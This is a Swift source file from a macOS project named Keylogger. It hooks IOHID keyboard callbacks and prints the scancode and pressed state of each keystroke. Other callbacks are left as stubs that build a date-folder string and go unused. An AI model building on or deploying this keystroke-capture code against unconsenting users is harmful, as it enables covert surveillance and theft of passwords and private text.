//
//  CallBackFunctions.swift
//  Keylogger
//
//  Created by Skrew Everything on 16/01/17.
//  Copyright © 2017 Skrew Everything. All rights reserved.
//

import Foundation
import Cocoa

class CallBackFunctions
{
    static var CAPSLOCK = false
    static var calander = Calendar.current
    static var prev = ""
    
    static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
    }
    
    static let Handle_DeviceRemovalCallback: IOHIDDeviceCallback = { context, result, sender, device in
        
            
            let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
            let dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
        }
     
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device );
        var test: Bool
        if (IOHIDElementGetUsagePage(elem) != 0x07)
        {
            return
        }
        let scancode = IOHIDElementGetUsage(elem);
        if (scancode < 4 || scancode > 231)
        {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device );
        print(pressed, scancode)
        return

    }
}
